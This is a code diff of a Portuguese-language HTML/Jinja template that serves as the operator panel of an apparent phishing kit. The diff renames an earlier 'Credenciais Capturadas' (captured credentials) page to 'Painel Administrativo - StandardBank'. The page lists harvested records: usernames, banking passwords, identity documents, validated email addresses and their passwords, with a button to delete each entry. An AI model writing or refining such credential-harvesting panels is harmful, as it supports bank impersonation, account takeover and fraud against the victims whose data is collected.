@@ -1,56 +1,108 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-  <meta charset="UTF-8">
-  <title>Credenciais Capturadas</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <title>Painel Administrativo - StandardBank</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
-      background: #121212;
-      color: #f1f1f1;
-      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
       padding: 20px;
+      font-family: 'Consolas', 'Courier New', monospace;
+      background: linear-gradient(to bottom, #0f172a, #1e293b);
+      color: #e2e8f0;
+      display: flex;
+      justify-content: center;
     }
-    h2 {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    table {
+    .container {
       width: 100%;
-      border-collapse: collapse;
-      background-color: #1e1e1e;
-      border-radius: 8px;
-      overflow: hidden;
+      max-width: 500px;
     }
-    th, td {
-      padding: 12px;
+    h1 {
       text-align: center;
-      border-bottom: 1px solid #333;
+      color: #38bdf8;
+      margin-bottom: 12px;
+      font-size: 1.5rem;
     }
-    th {
-      background: #2a2a2a;
-      color: #00d0ff;
+    .contador {
+      text-align: center;
+      color: #94a3b8;
+      font-size: 0.9rem;
+      margin-bottom: 24px;
     }
-    tr:hover {
-      background-color: #2f2f2f;
+    .registro {
+      background: rgba(30, 41, 59, 0.95);
+      border: 1px solid #334155;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.3);
+    }
+    .registro-title {
+      font-weight: bold;
+      color: #facc15;
+      margin-bottom: 12px;
+    }
+    .campo {
+      margin-bottom: 5px;
+    }
+    .excluir {
+      margin-top: 10px;
+    }
+    .excluir button {
+      background: #dc2626;
+      border: none;
+      color: white;
+      padding: 8px 14px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+    .excluir button:hover {
+      background: #ef4444;
+    }
+    .linha {
+      color: #64748b;
+      text-align: center;
+      margin-top: 14px;
+    }
+    .no-data {
+      text-align: center;
+      font-style: italic;
+      color: #94a3b8;
     }
   </style>
 </head>
 <body>
-  <h2>Credenciais Capturadas</h2>
-  <table>
-    <tr>
-      <th>Usuário/E-mail</th>
-      <th>Palavra-Chave</th>
-      <th>Telemóvel</th>
-    </tr>
-    {% for linha in dados %}
-      <tr>
-        <td>{{ linha[0] }}</td>
-        <td>{{ linha[1] }}</td>
-        <td>{{ linha[2] }}</td>
-      </tr>
+<div class="container">
+  <h1>Painel Administrativo - StandardBank</h1>
+
+  {% if dados %}
+    <div class="contador">🔢 Total de registros: {{ dados|length }}</div>
+    {% for registro in dados %}
+      <div class="registro">
+        <div class="registro-title">🗂️ Registro nº{{ loop.index }} — {{ registro['datahora'] }}</div>
+
+        <div class="campo">🧑‍💼 Usuário/E-mail: {{ registro['usuario'] }}</div>
+        <div class="campo">🔑 Palavra-Chave: {{ registro['palavrachave'] }}</div>
+        <div class="campo">📄 Documento: {{ registro['documento'] }}</div>
+        <br>
+        <div class="campo">📥 E-mail Validado: {{ registro['email'] }}</div>
+        <div class="campo">🔐 Senha do E-mail: {{ registro['senha_email'] }}</div>
+
+        <div class="excluir">
+          <form method="POST" action="/excluir/{{ registro['_id'] }}">
+            <button type="submit">🗑️ Excluir Registro</button>
+          </form>
+        </div>
+
+        <div class="linha">────────────────────────────────────────────</div>
+      </div>
     {% endfor %}
-  </table>
+  {% else %}
+    <p class="no-data">Nenhum dado encontrado.</p>
+  {% endif %}
+</div>
 </body>
 </html>
